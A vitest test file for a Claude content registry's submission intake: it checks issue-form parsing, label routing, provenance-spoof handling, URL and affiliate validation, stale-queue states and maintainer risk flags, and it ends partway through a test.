import { describe, expect, it } from "vitest";
import { execFileSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import {
  buildSubmissionQueue,
  buildSubmissionIssueDraft,
  isLikelyAffiliateUrl,
  looksLikeSubmissionIssue,
  parseIssueFormBody,
  recommendedSubmissionLabels,
  submissionQueueStatus,
  submissionStaleState,
  validateSubmission,
} from "@heyclaude/registry/submission";
import {
  analyzeDirectContentRisk,
  analyzeIssueSubmissionRisk,
  formatSubmissionRiskMarkdown,
} from "@heyclaude/registry/submission-risk";
import { categorySpec } from "@heyclaude/registry";
import {
  deriveSeoFields,
  validateEntry,
} from "@heyclaude/registry/content-schema";
import {
  buildIssueTemplateSpec,
  buildSubmissionFieldModel,
} from "@heyclaude/registry/submission-spec";
import { submissionLabelsForCategory } from "@heyclaude/registry/submission-labels";

const repoRoot = path.resolve(import.meta.dirname, "..");

function issue(body: string, labels = ["content-submission"]) {
  return {
    body,
    labels: labels.map((name) => ({ name })),
    title: "Submit MCP: example",
    number: 1,
    url: "https://github.com/owner/repo/issues/1",
    author: { login: "contributor" },
    updatedAt: "2026-04-26T00:00:00Z",
  };
}

function importSubmissionDryRun(
  issuePayload: Record<string, unknown>,
  env: Record<string, string> = {},
) {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "heyclaude-issue-"));
  const issuePath = path.join(tmpDir, "issue.json");
  fs.writeFileSync(issuePath, `${JSON.stringify(issuePayload, null, 2)}\n`);
  return execFileSync(
    process.execPath,
    [
      "scripts/import-submission-issue.mjs",
      "--issue-json",
      issuePath,
      "--dry-run",
    ],
    {
      cwd: repoRoot,
      env: { ...process.env, ...env },
      encoding: "utf8",
    },
  );
}

describe("submission intake", () => {
  it("derives web form and issue template fields from registry specs", () => {
    const model = buildSubmissionFieldModel("skills");
    expect(model).toBeTruthy();
    expect(
      model?.fields.some(
        (field) => field.id === "skill_type" && field.required,
      ),
    ).toBe(true);
    expect(
      model?.fields.some(
        (field) => field.id === "download_url" && !field.required,
      ),
    ).toBe(true);
    expect(
      model?.fields.some(
        (field) =>
          field.id === "contact_email" &&
          field.label === "Public contact" &&
          !field.required,
      ),
    ).toBe(true);
    expect(
      model?.fields.some(
        (field) => field.id === "brand_domain" && !field.required,
      ),
    ).toBe(true);

    const issueTemplate = buildIssueTemplateSpec("mcp");
    expect(issueTemplate).toBeTruthy();
    expect(issueTemplate?.labels).toContain("content-submission");
    expect(issueTemplate?.labels).toEqual(submissionLabelsForCategory("mcp"));
    expect(
      issueTemplate?.fields.some(
        (field) => field.id === "install_command" && field.required,
      ),
    ).toBe(true);
  });

  it("builds website submission issues from the canonical field model", () => {
    const draft = buildSubmissionIssueDraft({
      name: "Website Intake MCP",
      slug: "website-intake-mcp",
      category: "mcp",
      contact_email: "@maintainer",
      docs_url: "https://example.com/docs",
      brand_name: "Example",
      brand_domain: "example.com",
      description:
        "MCP server submitted directly through the website intake API.",
      card_description: "Website intake API coverage.",
      install_command: "npx -y website-intake-mcp",
      usage_snippet:
        "claude mcp add website-intake-mcp -- npx -y website-intake-mcp",
    });

    expect(draft.title).toBe("Submit MCP Server: Website Intake MCP");
    expect(draft.body).toContain("### Name");
    expect(draft.body).toContain("Website Intake MCP");
    expect(draft.body).toContain("### Brand domain");
    expect(draft.body).toContain("example.com");
    expect(draft.labels).toEqual([
      "content-submission",
      "needs-review",
      "community-mcp",
    ]);
    expect(validateSubmission(draft).ok).toBe(true);
  });

  it("imports direct GitHub submissions with content-level provenance", () => {
    const output = importSubmissionDryRun(
      {
        number: 777,
        html_url: "https://github.com/JSONbored/awesome-claude/issues/777",
        created_at: "2026-04-28T12:34:56Z",
        user: {
          login: "content-author",
          html_url: "https://github.com/content-author",
        },
        body: buildSubmissionIssueDraft({
          name: "Provenance MCP",
          slug: "provenance-mcp",
          category: "mcp",
          author: "Example Team",
          docs_url: "https://example.com/docs",
          description:
            "MCP server submitted through a direct GitHub issue with provenance.",
          card_description: "Direct GitHub issue provenance coverage.",
          install_command: "npx -y provenance-mcp",
          usage_snippet:
            "claude mcp add provenance-mcp -- npx -y provenance-mcp",
        }).body,
        labels: [{ name: "content-submission" }, { name: "community-mcp" }],
      },
      {
        SUBMISSION_REVIEWED_BY: "JSONbored",
        SUBMISSION_REVIEWED_AT: "2026-04-29T00:00:00Z",
      },
    );

    expect(output).toContain("submittedBy: content-author");
    expect(output).toContain(
      'submittedByUrl: "https://github.com/content-author"',
    );
    expect(output).toContain('submittedAt: "2026-04-28T12:34:56Z"');
    expect(output).toContain("submissionIssueNumber: 777");
    expect(output).toContain(
      'submissionIssueUrl: "https://github.com/JSONbored/awesome-claude/issues/777"',
    );
    expect(output).toContain("reviewedBy: JSONbored");
    expect(output).toContain("claimStatus: unclaimed");
  });

  it("does not publish website token owners as submitters", () => {
    const output = importSubmissionDryRun({
      number: 778,
      html_url: "https://github.com/JSONbored/awesome-claude/issues/778",
      created_at: "2026-04-28T12:34:56Z",
      user: {
        login: "JSONbored",
        html_url: "https://github.com/JSONbored",
      },
      body: buildSubmissionIssueDraft({
        name: "Website Token MCP",
        slug: "website-token-mcp",
        category: "mcp",
        author: "Example Team",
        contact_email: "maintainer@example.com",
        submitted_via: "website",
        docs_url: "https://example.com/docs",
        description:
          "MCP server submitted through the website with private contact details.",
        card_description: "Website token provenance privacy coverage.",
        install_command: "npx -y website-token-mcp",
        usage_snippet:
          "claude mcp add website-token-mcp -- npx -y website-token-mcp",
      }).body,
      labels: [{ name: "content-submission" }, { name: "community-mcp" }],
    });

    expect(output).not.toContain("submittedBy:");
    expect(output).not.toContain("submittedByUrl:");
    expect(output).not.toContain("submittedBy: JSONbored");
    expect(output).not.toContain(
      "submittedByUrl: https://github.com/JSONbored",
    );
    expect(output).not.toContain("maintainer@example.com");
  });

  it("does not trust website public contact handles as submitter provenance", () => {
    const output = importSubmissionDryRun({
      number: 780,
      html_url: "https://github.com/JSONbored/awesome-claude/issues/780",
      created_at: "2026-04-28T12:34:56Z",
      user: {
        login: "JSONbored",
        html_url: "https://github.com/JSONbored",
      },
      body: buildSubmissionIssueDraft({
        name: "Website Contact Spoof MCP",
        slug: "website-contact-spoof-mcp",
        category: "mcp",
        author: "Example Team",
        contact_email: "victim-user",
        submitted_via: "website",
        docs_url: "https://example.com/docs",
        description:
          "MCP server submitted through the website with an unverified public contact handle.",
        card_description: "Website public contact provenance spoof coverage.",
        install_command: "npx -y website-contact-spoof-mcp",
        usage_snippet:
          "claude mcp add website-contact-spoof-mcp -- npx -y website-contact-spoof-mcp",
      }).body,
      labels: [{ name: "content-submission" }, { name: "community-mcp" }],
    });

    expect(output).not.toContain("submittedBy:");
    expect(output).not.toContain("submittedByUrl:");
    expect(output).not.toContain("submittedBy: victim-user");
    expect(output).not.toContain("https://github.com/victim-user");
    expect(output).not.toContain("submittedBy: JSONbored");
  });

  it("does not trust submitted_via from direct GitHub issue bodies", () => {
    const output = importSubmissionDryRun({
      number: 779,
      html_url: "https://github.com/JSONbored/awesome-claude/issues/779",
      created_at: "2026-04-28T12:34:56Z",
      user: {
        login: "attacker-user",
        html_url: "https://github.com/attacker-user",
      },
      body: buildSubmissionIssueDraft({
        name: "Spoofed Website MCP",
        slug: "spoofed-website-mcp",
        category: "mcp",
        author: "Example Team",
        contact_email: "victim-user",
        submitted_via: "website",
        docs_url: "https://example.com/docs",
        description:
          "MCP server submitted through a direct GitHub issue with a forged website marker.",
        card_description: "Direct issue provenance spoof coverage.",
        install_command: "npx -y spoofed-website-mcp",
        usage_snippet:
          "claude mcp add spoofed-website-mcp -- npx -y spoofed-website-mcp",
      }).body,
      labels: [{ name: "content-submission" }, { name: "community-mcp" }],
    });

    expect(output).toContain("submittedBy: attacker-user");
    expect(output).toContain(
      'submittedByUrl: "https://github.com/attacker-user"',
    );
    expect(output).not.toContain("submittedBy: victim-user");
    expect(output).not.toContain("https://github.com/victim-user");
  });

  it("normalizes brand domains and rejects unsafe brand values", () => {
    const shapedIssue = issue(`### Name
Brand Intake MCP

### Slug
brand-intake-mcp

### Category
mcp

### Description
MCP server submitted with optional brand metadata.

### Card description
Brand metadata coverage.

### Brand name
Asana

### Brand domain
https://www.asana.com/docs

### Install command
npx -y brand-intake-mcp

### Usage snippet
claude mcp add brand-intake-mcp -- npx -y brand-intake-mcp`);

    const report = validateSubmission(shapedIssue);
    expect(report.ok).toBe(true);
    expect(report.fields.brand_domain).toBe("asana.com");

    const invalid = validateSubmission(
      issue(`### Name
Broken Brand MCP

### Slug
broken-brand-mcp

### Category
mcp

### Description
MCP server submitted with invalid brand metadata.

### Card description
Invalid brand metadata coverage.

### Brand domain
not a domain

### Install command
npx -y broken-brand-mcp

### Usage snippet
claude mcp add broken-brand-mcp -- npx -y broken-brand-mcp`),
    );
    expect(invalid.ok).toBe(false);
    expect(invalid.errors).toContain(
      "brand_domain must be a canonical domain such as asana.com",
    );
  });

  it("keeps checked-in GitHub issue templates aligned with registry specs", () => {
    for (const category of categorySpec.submissionOrder) {
      const template = buildIssueTemplateSpec(category);
      expect(template).toBeTruthy();
      const templatePath = path.join(
        repoRoot,
        ".github",
        "ISSUE_TEMPLATE",
        template!.template,
      );
      const source = fs.readFileSync(templatePath, "utf8");
      for (const label of template!.labels) {
        expect(source).toContain(`  - "${label}"`);
      }
      for (const field of template!.fields.filter((field) => field.required)) {
        expect(source).toContain(`    id: ${field.id}`);
        expect(source).toContain("      required: true");
      }
      expect(source).toContain(
        "maintainers review accepted submissions before an import PR is opened",
      );
      expect(source).toContain(
        "Do not open a separate README change for issue submissions",
      );
      expect(source).toContain(
        "I understand accepted imports regenerate the README and registry artifacts automatically",
      );
      expect(source).toContain("not affiliate, referral, or tracking URLs");
    }
  });

  it("normalizes category aliases and slugs", () => {
    const report = validateSubmission(
      issue(`### Name
Prompt-to-asset

### Slug
Prompt-to-asset

### Category
Mcp

### Public contact
dev@example.com

### Description
MCP server that generates visual assets.

### Card description
Generate app icons and favicons.

### Install command
npx -y prompt-to-asset

### Usage snippet
claude mcp add prompt-to-asset -- npx -y prompt-to-asset`),
    );
    expect(report.ok).toBe(true);
    expect(report.category).toBe("mcp");
    expect(report.fields.slug).toBe("prompt-to-asset");
  });

  it("does not rely on the retired submission label", () => {
    expect(
      looksLikeSubmissionIssue({
        body: "This old label by itself should not trigger the queue.",
        labels: [{ name: "submission" }],
        title: "General question",
      }),
    ).toBe(false);

    const shapedIssue = issue(
      `### Name
ContrastAPI

### Slug
ContrastAPI

### Category
mcp-server

### Description
MCP server for contrast checks.

### Card description
Check color contrast from Claude.

### Install command
npx -y contrastapi

### Usage snippet
claude mcp add contrastapi -- npx -y contrastapi`,
      ["submission"],
    );
    expect(looksLikeSubmissionIssue(shapedIssue)).toBe(true);
    expect(validateSubmission(shapedIssue).ok).toBe(true);
  });

  it("detects and labels unlabeled submission-shaped issues", () => {
    const unlabeled = issue(
      `### Name
Prompt-to-asset

### Slug
Prompt-to-asset

### Category
Mcp

### Public contact
dev@example.com

### Description
MCP server that generates visual assets.

### Card description
Generate app icons and favicons.

### Install command
npx -y prompt-to-asset

### Usage snippet
claude mcp add prompt-to-asset -- npx -y prompt-to-asset`,
      [],
    );
    expect(looksLikeSubmissionIssue(unlabeled)).toBe(true);
    expect(validateSubmission(unlabeled).ok).toBe(true);
    expect(recommendedSubmissionLabels(unlabeled)).toEqual([
      "community-mcp",
      "content-submission",
      "needs-review",
      "source-needs-verification",
    ]);
  });

  it("routes freeform submit issues into author input instead of skipping them", () => {
    const freeform = {
      ...issue(
        `Category:
- mcp

Canonical source and docs:
- GitHub URL: https://github.com/zjg678/suppr-mcp
- Docs URL: https://github.com/zjg678/suppr-mcp#readme

Install command:
\`\`\`bash
npx -y suppr-mcp
\`\`\``,
        [],
      ),
      title: "Submit MCP Server: Suppr MCP Server",
    };

    expect(looksLikeSubmissionIssue(freeform)).toBe(true);
    expect(parseIssueFormBody(freeform.body)).toMatchObject({
      category: "mcp",
      github_url: "https://github.com/zjg678/suppr-mcp",
      docs_url: "https://github.com/zjg678/suppr-mcp#readme",
    });

    const report = validateSubmission(freeform);
    expect(report.skipped).toBe(false);
    expect(report.ok).toBe(false);
    expect(recommendedSubmissionLabels(freeform, report)).toEqual(
      expect.arrayContaining([
        "community-mcp",
        "content-submission",
        "needs-author-input",
        "needs-review",
      ]),
    );
  });

  it("routes Submit-colon titles into submission review labels", () => {
    const colonTitle = {
      ...issue(
        `Category:
- mcp

GitHub URL:
https://github.com/Fifty-Five-and-Five/ultrathink-mcp`,
        [],
      ),
      title: "Submit: Ultrathink MCP Server",
    };

    expect(looksLikeSubmissionIssue(colonTitle)).toBe(true);
    const report = validateSubmission(colonTitle);
    expect(report.skipped).toBe(false);
    expect(report.ok).toBe(false);
    expect(recommendedSubmissionLabels(colonTitle, report)).toEqual(
      expect.arrayContaining([
        "community-mcp",
        "content-submission",
        "needs-author-input",
        "needs-review",
      ]),
    );
  });

  it("builds a maintainer submission queue", () => {
    const valid = issue(`### Name
ContrastAPI

### Slug
contrastapi

### Category
mcp

### Public contact
dev@example.com

### GitHub URL
https://github.com/example/contrastapi

### Description
Security MCP.

### Card description
Security MCP.

### Install command
claude mcp add contrastapi --transport http https://example.com/mcp

### Usage snippet
claude mcp list`);
    const invalid = issue(`### Name
Unslop

### Slug
unslop

### Category
skills

### Public contact
dev@example.com

### Description
Writing cleanup.

### Card description
Writing cleanup.

### Usage snippet
npx unslop --help`);
    const queue = buildSubmissionQueue(
      [valid, invalid, { title: "Question" }],
      { now: "2026-04-30T00:00:00Z" },
    );
    expect(queue.count).toBe(2);
    expect(queue.schemaVersion).toBe(2);
    expect(queue.summary.importReady).toBe(1);
    expect(queue.summary.needsChanges).toBe(1);
    expect(queue.entries[0].status).toBe("import_ready");
    expect(queue.entries[0].nextAction).toBe("import");
    expect(queue.entries[0].importPath).toBe("content/mcp/contrastapi.mdx");
    expect(queue.entries[0].sourceUrl).toBe(
      "https://github.com/example/contrastapi",
    );
    expect(queue.entries[0].missingLabels).toEqual(
      expect.arrayContaining(["community-mcp", "needs-review"]),
    );
    expect(queue.entries[0].reviewChecklist).toEqual(
      expect.arrayContaining([
        "Confirm the category, slug, and public-facing metadata.",
        "Apply import-approved only after source and category review.",
      ]),
    );
    expect(queue.entries[1].status).toBe("needs_author_input");
    expect(queue.entries[1].nextAction).toBe("request_author_input");
    expect(queue.entries[1].actionDue).toBe("author_input");
    expect(queue.entries[1].commentDraft).toContain(
      "can't continue review until the issue has the required metadata",
    );
  });

  it("tracks stale author-input states without touching maintainer-approved issues", () => {
    const invalidBody = `### Name
Unslop

### Slug
unslop

### Category
skills

### Public contact
dev@example.com

### Description
Writing cleanup.

### Card description
Writing cleanup.

### Usage snippet
npx unslop --help`;
    const fresh = issue(invalidBody, ["content-submission"]);
    const reminderDue = {
      ...issue(invalidBody, ["content-submission"]),
      updatedAt: "2026-04-20T00:00:00Z",
    };
    const closeEligible = {
      ...issue(invalidBody, ["content-submission", "stale-submission"]),
      updatedAt: "2026-04-10T00:00:00Z",
    };
    const approved = {
      ...issue(invalidBody, ["content-submission", "import-approved"]),
      updatedAt: "2026-04-10T00:00:00Z",
    };

    const report = validateSubmission(fresh);
    expect(report.ok).toBe(false);
    expect(
      submissionQueueStatus(report, fresh, { now: "2026-04-30T00:00:00Z" }),
    ).toBe("needs_author_input");
    expect(
      submissionStaleState(reminderDue, validateSubmission(reminderDue), {
        now: "2026-04-30T00:00:00Z",
      }),
    ).toBe("reminder_due");
    expect(
      submissionQueueStatus(validateSubmission(closeEligible), closeEligible, {
        now: "2026-04-30T00:00:00Z",
      }),
    ).toBe("close_eligible");
    expect(
      submissionQueueStatus(validateSubmission(approved), approved, {
        now: "2026-04-30T00:00:00Z",
      }),
    ).toBe("maintainer_review");

    const queue = buildSubmissionQueue(
      [fresh, reminderDue, closeEligible, approved],
      { now: "2026-04-30T00:00:00Z" },
    );
    expect(
      queue.entries.find((entry) => entry.status === "stale_reminder_due")
        ?.nextAction,
    ).toBe("send_stale_reminder");
    expect(
      queue.entries.find((entry) => entry.status === "close_eligible")
        ?.nextAction,
    ).toBe("close_stale");
    expect(
      queue.entries.find((entry) => entry.status === "maintainer_review")
        ?.nextAction,
    ).toBe("import");
    expect(
      queue.entries.find((entry) => entry.status === "close_eligible")
        ?.commentDraft,
    ).toContain("Closing this submission as not planned");
  });

  it("separates source verification from author-input failures", () => {
    const sourceProblem = issue(
      `### Name
Source Review MCP

### Slug
source-review-mcp

### Category
mcp

### Public contact
dev@example.com

### GitHub URL
https://github.com/example/source-review-mcp

### Description
MCP server with a source that maintainers marked for verification.

### Card description
Source verification coverage.

### Install command
npx -y source-review-mcp

### Usage snippet
claude mcp add source-review-mcp -- npx -y source-review-mcp`,
      ["content-submission", "source-needs-verification"],
    );
    const report = validateSubmission(sourceProblem);
    expect(report.ok).toBe(true);
    expect(
      submissionQueueStatus(report, sourceProblem, {
        now: "2026-04-30T00:00:00Z",
      }),
    ).toBe("source_needs_verification");
    expect(recommendedSubmissionLabels(sourceProblem)).toContain(
      "source-needs-verification",
    );
    const queue = buildSubmissionQueue([sourceProblem], {
      now: "2026-04-30T00:00:00Z",
    });
    expect(queue.entries[0].nextAction).toBe("verify_source");
    expect(queue.entries[0].commentDraft).toContain(
      "needs source verification before it can be imported",
    );
  });

  it("rejects missing required category fields", () => {
    const report = validateSubmission(
      issue(`### Name
Unslop

### Slug
Unslop

### Category
Skill

### Public contact
dev@example.com

### Description
Clean AI writing patterns.

### Card description
Clean AI writing patterns.

### Install command
npx -y unslop

### Usage snippet
npx unslop --help`),
    );
    expect(report.ok).toBe(false);
    expect(report.category).toBe("skills");
    expect(report.errors).toContain("Missing required field: skill_type");
  });

  it("rejects community requests for local package hosting", () => {
    const report = validateSubmission(
      issue(`### Name
Local Package

### Slug
local-package

### Category
skills

### Public contact
dev@example.com

### Description
Test local package.

### Card description
Test local package.

### Download URL (optional)
/downloads/skills/local-package.zip

### Skill type
general

### Skill level
advanced

### Verification status
draft

### Usage snippet
Use it.`),
    );
    expect(report.ok).toBe(false);
    expect(report.errors).toContain(
      "Community submissions cannot request local /downloads hosting",
    );
  });

  it("rejects contributor affiliate and referral URLs", () => {
    expect(isLikelyAffiliateUrl("https://example.com/?affiliate=creator")).toBe(
      true,
    );
    const report = validateSubmission(
      issue(`### Name
Referral Tool

### Slug
referral-tool

### Category
mcp

### Public contact
dev@example.com

### GitHub URL
https://github.com/example/referral-tool?referral=affiliate

### Description
Referral test.

### Card description
Referral test.

### Install command
npx referral-tool

### Usage snippet
claude mcp add referral-tool -- npx referral-tool`),
    );
    expect(report.ok).toBe(false);
    expect(report.errors).toContain(
      "Contributor submissions cannot include affiliate/referral URLs: github_url",
    );
  });

  it("rejects malformed or non-https contributor URLs", () => {
    const report = validateSubmission(
      issue(`### Name
Insecure URL Tool

### Slug
insecure-url-tool

### Category
mcp

### Public contact
dev@example.com

### GitHub URL
http://example.com/repo

### Description
MCP server with an insecure source URL.

### Card description
Insecure source URL test.

### Install command
npx insecure-url-tool

### Usage snippet
claude mcp add insecure-url-tool -- npx insecure-url-tool`),
    );
    expect(report.ok).toBe(false);
    expect(report.errors).toContain("github_url must be a valid https URL");
  });

  it("derives bounded SEO metadata for imported UGC", () => {
    const seo = deriveSeoFields(
      {
        title: "Website Intake MCP",
        description:
          "MCP server submitted directly through the website intake API for reviewable community contributions.",
        tags: ["mcp", "submission", "community"],
      },
      "mcp",
    );

    expect(seo.seoTitle.length).toBeLessThanOrEqual(70);
    expect(seo.seoDescription.length).toBeLessThanOrEqual(160);
    expect(seo.keywords).toEqual(
      expect.arrayContaining(["mcp", "submission", "community", "claude"]),
    );
  });

  it("maps generic full copyable content headings into the required field", () => {
    const report = validateSubmission(
      issue(`### Name
Build Review Agent

### Slug
build-review-agent

### Category
agents

### Description
Specialized review agent for checking build logs and summarizing failures.

### Card description
Agent for build log review.

### Full copyable content
Review build logs, identify the failing step, and summarize the likely fix.`),
    );

    expect(report.ok).toBe(true);
    expect(report.fields.full_copyable_content).toContain("Review build logs");
  });

  it("preserves MCP config snippet headings during import", () => {
    const body = buildSubmissionIssueDraft({
      name: "Config Snippet MCP",
      slug: "config-snippet-mcp",
      category: "mcp",
      docs_url: "https://example.com/mcp",
      description:
        "Hosted MCP server submitted with a client configuration snippet.",
      card_description: "Config snippet import coverage.",
      install_command:
        "claude mcp add --transport http config-snippet https://example.com/mcp",
      usage_snippet: "claude mcp status config-snippet",
      config_snippet: `\`\`\`json
{
  "mcpServers": {
    "config-snippet": {
      "type": "http",
      "url": "https://example.com/mcp"
    }
  }
}
\`\`\``,
    }).body;

    const report = validateSubmission(issue(body));
    expect(report.ok).toBe(true);
    expect(report.fields.config_snippet).toContain('"mcpServers"');

    const output = importSubmissionDryRun({
      number: 779,
      html_url: "https://github.com/JSONbored/awesome-claude/issues/779",
      created_at: "2026-05-10T00:00:00Z",
      user: {
        login: "content-author",
        html_url: "https://github.com/content-author",
      },
      body,
      labels: [{ name: "content-submission" }, { name: "community-mcp" }],
    });

    expect(output).toContain("configSnippet: |-");
    expect(output).toContain('"mcpServers"');
    expect(output).toContain('"url": "https://example.com/mcp"');
  });

  it("adds deterministic security/safety context to the maintainer queue", () => {
    const legal = issue(`### Name
Spain Legal by Legal Fournier

### Slug
legal-fournier-spain-legal-mcp

### Category
mcp

### Docs URL
https://legalfournier.com/en/mcp/spain-legal/

### Description
Read-only MCP server for Spain legal route screening, visa options, residency paths, and human handoff preparation.

### Card description
Read-only Spain legal MCP for immigration route screening.

### Install command
claude mcp add --transport http legal-fournier-spain-legal https://legalfournier.com/mcp/spain-legal

### Usage snippet
claude mcp status legal-fournier-spain-legal`);
    const memesio = issue(`### Name
Memesio MCP Server

### Slug
memesio-mcp-server

### Category
mcp

### Docs URL
https://memesio.com/developers/mcp

### Description
Hosted MCP endpoint for meme template discovery, captioned meme creation, and optional keyed AI meme generation.

### Card description
Hosted MCP for meme rendering and optional keyed AI actions.

### Install command
claude mcp add --transport http memesio https://memesio.com/api/mcp

### Usage snippet
Use optional x-api-key authentication for higher limits.`);
    const friday = issue(`### Name
Friday Studio

### Slug
friday-studio

### Category
agents

### GitHub URL
https://github.com/friday-platform/friday-studio

### Description
Agentic AI runtime and desktop app that runs a daemon, local workspace automation, MCP tools, and scheduled workflows.

### Card description
Agentic AI workspaces that run on schedule.

### Full copyable content
Clone the repository, run setup, then start the daemon and playground.`);
    const starWhisper = issue(`### Name
Christian Merjudio

### Slug
christian-merjudio

### Category
commands

### Description
StarWhisper is voice-to-text software for Windows with offline transcription, OpenAI API integration, and Pro plans.

### Card description
Free voice-to-text software for Windows.

### Command syntax
karloamalia

### Usage snippet
Free voice-to-text software for Windows.

### Full copyable content
Free voice-to-text software for Windows.`);
    const zkproofport = issue(`### Name
ZKProofport MCP

### Slug
zkproofport-mcp

### Category
mcp

### GitHub URL
https://github.com/zkproofport/proofport-ai

### Description
Zero-knowledge proof generation MCP for KYC, country, Google OIDC, wallet private keys, x402 USDC payments, and Nitro Enclave proving.

### Card description
ZK proof generation for identity claims.

### Install command
npm install -g @zkproofport-ai/mcp`);
    const macuse = issue(`### Name
Macuse

### Slug
macuse

### Category
mcp

### GitHub URL
https://github.com/macuseapp/macuse

### Description
Native macOS MCP server with Accessibility, Mail, Calendar, Messages, UI automation, and personal app access.

### Card description
macOS MCP automation for native apps.`);

    const queue = buildSubmissionQueue(
      [legal, memesio, friday, starWhisper, zkproofport, macuse],
      { now: "2026-05-09T00:00:00Z" },
    );

    expect(
      queue.entries.find(
        (entry) => entry.slug === "legal-fournier-spain-legal-mcp",
      )?.riskFlags,
    ).not.toContain("regulated_domain");
    expect(
      queue.entries.find((entry) => entry.slug === "memesio-mcp-server")
        ?.riskFlags,
    ).toContain("requires_credentials");
    expect(
      queue.entries.find((entry) => entry.slug === "memesio-mcp-server")
        ?.riskSummary,
    ).toContain("credentials_or_auth");
    expect(
      queue.entries.find((entry) => entry.slug === "christian-merjudio")
        ?.sourceState,
    ).toBe("missing");
    expect(
      queue.entries.find((entry) => entry.slug === "christian-merjudio")
        ?.maintainerActions,
    ).toContain(
      "Ask for a canonical source, docs, repository, or package URL.",
    );
    expect(
      queue.entries.find((entry) => entry.slug === "friday-studio")?.riskFlags,
    ).not.toContain("possible_category_mismatch");
    expect(
      queue.entries.find((entry) => entry.slug === "friday-studio")?.riskFlags,
    ).toEqual(expect.arrayContaining(["local_or_personal_data_access"]));
    expect(
      queue.entries.find((entry) => entry.slug === "friday-studio")?.errors,
    ).toEqual(
      expect.arrayContaining([
        expect.stringContaining("tools/app listing flow"),
      ]),
    );
    expect(
      queue.entries.find((entry) => entry.slug === "christian-merjudio")
        ?.riskFlags,
    ).toContain("no_canonical_source");
    expect(
      queue.entries.find((entry) => entry.slug === "christian-merjudio")
        ?.riskFlags,
    ).not.toContain("promotion_or_paid_placement_language");
    expect(
      queue.entries.find((entry) => entry.slug === "christian-merjudio")
        ?.errors,
    ).toEqual(
      expect.arrayContaining([
        expect.stringContaining("tools/app listing flow"),
      ]),
    );
    expect(
      queue.entries.find((entry) => entry.slug === "zkproofport-mcp")
        ?.riskFlags,
    ).toContain("financial_or_identity_sensitive");
    expect(
      queue.entries.find((entry) => entry.slug === "macuse")?.riskFlags,
    ).toContain("local_or_personal_data_access");
  });

  it("routes hosted products and apps to tools listing review", () => {
    const bodyForCategory = (category: string) => `### Name
MultipleChat

### Slug
multiplechat

### Category
${category}

### Website URL
https://multiplechat.ai/

### Description
MultipleChat is a hosted SaaS product for running ChatGPT, Claude, Gemini, Grok, and Perplexity from one interface with Smart AI Processing.

### Card description
Multi-model AI workspace for verified answers.

### Full copyable content
Free to try with no credit card. Plans include an all-in-one subscription for document, presentation, Excel, and image tools.`;

    for (const category of ["agents", "mcp", "skills", "commands"]) {
      const report = validateSubmission(issue(bodyForCategory(category)));
      expect(report.ok).toBe(false);
      expect(report.errors).toEqual(
        expect.arrayContaining([
          expect.stringContaining("tools/app listing flow"),
        ]),
      );
    }
  });

  it("allows maintainer-approved tools issues with listing metadata", () => {
    const toolIssue = issue(
      `### Name
MultipleChat

### Slug
multiplechat

### Category
tools

### Website URL
https://multiplechat.ai/

### Features URL
https://multiplechat.ai/features

### Pricing model
freemium

### Disclosure
editorial

### Application category
WebApplication

### Operating system
Web

### Description
Hosted multi-model AI workspace for running ChatGPT, Claude, Gemini, Grok, and Perplexity from one interface.

### Card description
Multi-model AI workspace for verified answers.`,
      ["content-submission", "accepted"],
    );

    const report = validateSubmission(toolIssue);
    expect(report.ok).toBe(true);
    expect(report.category).toBe("tools");
    expect(report.fields.website_url).toBe("https://multiplechat.ai/");
    expect(report.fields.pricing_model).toBe("freemium");
  });

  it("formats direct content PR risk without executing submitted files", () => {
    const report = analyzeDirectContentRisk({
      sourceType: "external_direct",
      pullRequest: {
        number: 326,
        title: "Add Xquik MCP server listing",
        html_url: "https://github.com/JSONbored/awesome-claude/pull/326",
        user: { login: "kriptoburak" },
      },
      contributor: {
        login: "kriptoburak",
        created_at: "2014-09-12T23:53:37Z",
        public_repos: 313,
      },
      files: [
        {
          filename: "content/mcp/xquik-mcp-server.mdx",
          status: "added",
          content: `---
title: Xquik MCP Server
slug: xquik-mcp-server
category: mcp
description: Remote MCP server for X and Twitter automation, tweet search, webhooks, and confirmation-gated posting.
submittedBy: kriptoburak
submittedByUrl: https://github.com/kriptoburak
repoUrl: https://github.com/Xquik-dev/x-twitter-scraper
documentationUrl: https://docs.xquik.com/mcp/overview
installCommand: "npx -y mcp-remote@0.1.38 https://xquik.com/mcp --header x-api-key:\${XQUIK_API_KEY}"
usageSnippet: "Use an API key for Xquik social media posting workflows."
---
## Security Notes
Review payloads before posting tweets, replies, DMs, or profile updates.`,
        },
      ],
    });

    expect(report.riskTier).toBe("high");
    expect(report.reviewFlags.map((flag) => flag.id)).toEqual(
      expect.arrayContaining([
        "requires_credentials",
        "external_write_capability",
      ]),
    );
    expect(report.recommendedLabels).toEqual(["risk-high"]);
    expect(report.provenanceStatus).toBe("passed");
    expect(report.effectiveContributor?.login).toBe("kriptoburak");
    expect(formatSubmissionRiskMarkdown(report)).toContain(
      "<!-- submission-risk-report -->",
    );
    expect(formatSubmissionRiskMarkdown(report)).toContain(
      "Submission security/safety review",
    );
    expect(report.contributorAnalysis).toMatchObject({
      login: "kriptoburak",
      source: "pull_request_author",
      resolutionStatus: "resolved",
      publicRepos: 313,
    });
    expect(report.contributionAnalysis.capabilityRiskBuckets).toEqual(
      expect.arrayContaining(["credentials_or_auth", "external_write"]),
    );
    expect(report.contributionAnalysis.sourceState).toBe("provided");
  });

  it("keeps malformed contributor payloads from becoming GitHub mentions", () => {
    const body = buildSubmissionIssueDraft({
      name: "Malformed Contributor MCP",
      slug: "malformed-contributor-mcp",
      category: "mcp",
      docs_url: "https://example.com/docs",
      description:
        "MCP server submitted through issue validation with contributor metadata.",
      card_description: "Contributor metadata regression coverage.",
      install_command: "npx -y malformed-contributor-mcp",
      usage_snippet:
        "claude mcp add malformed-contributor-mcp -- npx -y malformed-contributor-mcp",
    }).body;
    const validIssue = {
      ...issue(body),
      user: { login: "zjg678", html_url: "https://github.com/zjg678" },
      author: { login: "zjg678" },
    };
    const report = analyzeIssueSubmissionRisk(
      validIssue,
      validateSubmission(validIssue),
      {
        contributor: {
          login: "&Analyze user profile system implementation #64;zjg678",
          name: "&Analyze user profile system implementation #64;zjg678",
        },
      },
    );
    const markdown = formatSubmissionRiskMarkdown(report);

    expect(report.effectiveContributor?.login).toBe("zjg678");
    expect(report.contributorAnalysis.login).toBe("zjg678");
    expect(markdown).toContain("Contributor analyzed: @zjg678");
    expect(markdown).not.toContain(
      "Analyze user profile system implementation",
    );
